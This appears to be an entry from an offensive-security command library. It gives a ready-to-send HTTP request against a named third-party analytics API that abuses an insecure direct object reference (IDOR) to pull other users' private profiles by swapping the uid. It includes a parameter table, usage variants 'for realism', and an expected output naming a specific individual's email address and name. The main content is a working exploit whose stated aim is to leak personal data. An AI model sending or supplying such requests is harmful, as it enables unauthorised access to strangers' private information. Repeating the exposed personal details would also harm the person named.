---
data: >-
  POST /observe/v2/profiles/dawda HTTP/1.1

  Host: fast.trychameleon.com

  Connection: close

  Content-Length: 260

  Accept: */*

  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
  (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36

  Content-Type: text/plain

  Origin: https://apps.topcoder.com/

  Sec-Fetch-Site: cross-site

  Sec-Fetch-Mode: cors

  Sec-Fetch-Dest: empty

  Referer: https://apps.topcoder.com/

  Accept-Encoding: gzip, deflate

  Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7


  {"id":"5ff4c6eca2227c001d72c4b8","uid":"40991562","username":"nochnoidozorh1","browser_x":1366,"browser_n":"chrome","browser_k":"desktop","browser_tz":3,"now":"2021-01-09T09:56:10.892Z","_method":"PATCH","_mode":"user","_account_id":"59aedc1ce5680b0004301f6d"}
tags:
  - api
  - exploit
  - idor
type: command
output: >-
  {"profile":{"created_at":"2019-11-16T15:44:25.000Z","email":"nochnoidozorh1@gmail.com","first_name":"Nochnoi","last_name":"Dozor","roles":["Topcoder
  User"]}}
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:28.963Z'
id: 07bc2d45-53a4-4e89-bfc9-01c126856039
verified: false
validated: true
submitted: true
---
# post-request-to-chameleon-api-with-modified-uid

## Command

```http
POST /observe/v2/profiles/dawda HTTP/1.1
Host: fast.trychameleon.com
Connection: close
Content-Length: 260
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Content-Type: text/plain
Origin: https://apps.topcoder.com/
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://apps.topcoder.com/
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7

{"id":"5ff4c6eca2227c001d72c4b8","uid":"40991562","username":"nochnoidozorh1","browser_x":1366,"browser_n":"chrome","browser_k":"desktop","browser_tz":3,"now":"2021-01-09T09:56:10.892Z","_method":"PATCH","_mode":"user","_account_id":"59aedc1ce5680b0004301f6d"}
```

## Description

This HTTP POST command sends a modified request to the Chameleon API's profiles endpoint, exploiting IDOR by using a target user's UID to retrieve their private profile data. Use in tools like Burp Repeater or curl after interception and editing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| uid | Target user's numeric ID (e.g., 40991562) | Yes |
| now | ISO timestamp for the request (e.g., 2021-01-09T09:56:10.892Z) | Yes |
| id | Unique request ID (e.g., 5ff4c6eca2227c001d72c4b8) | Yes |
| username | Target username (e.g., nochnoidozorh1) | Yes |
| browser_x | Browser width in pixels (e.g., 1366) | No |
| browser_n | Browser name (e.g., chrome) | No |
| browser_k | Browser kind (e.g., desktop) | No |
| browser_tz | Timezone offset (e.g., 3) | No |
| _method | HTTP method override (PATCH) | Yes |
| _mode | Request mode (user) | Yes |
| _account_id | Account ID (e.g., 59aedc1ce5680b0004301f6d) | Yes |
| Path segment (e.g., dawda) | Random string appended to /profiles/ | Yes |

## Examples

### Basic Usage

Send the request with target UID to leak PII:

```http
POST /observe/v2/profiles/random123 HTTP/1.1
Host: fast.trychameleon.com
Content-Type: text/plain

{"uid":"40991562", ...}
```

### Advanced Usage

Customize browser details and timestamp for realism:

```http
POST /observe/v2/profiles/testuid HTTP/1.1
Host: fast.trychameleon.com

{"uid":"12345678","now":"2023-10-01T12:00:00Z", ...}
```

## Expected Output

JSON response containing the target profile with private PII, such as email, first/last name, created_at, and roles. Example: {"profile":{"email":"user@example.com","first_name":"John","last_name":"Doe","roles":["Topcoder User"]}}.

## Related

- [[Related Procedure: Send-Modified-Request-to-Exploit-IDOR]]
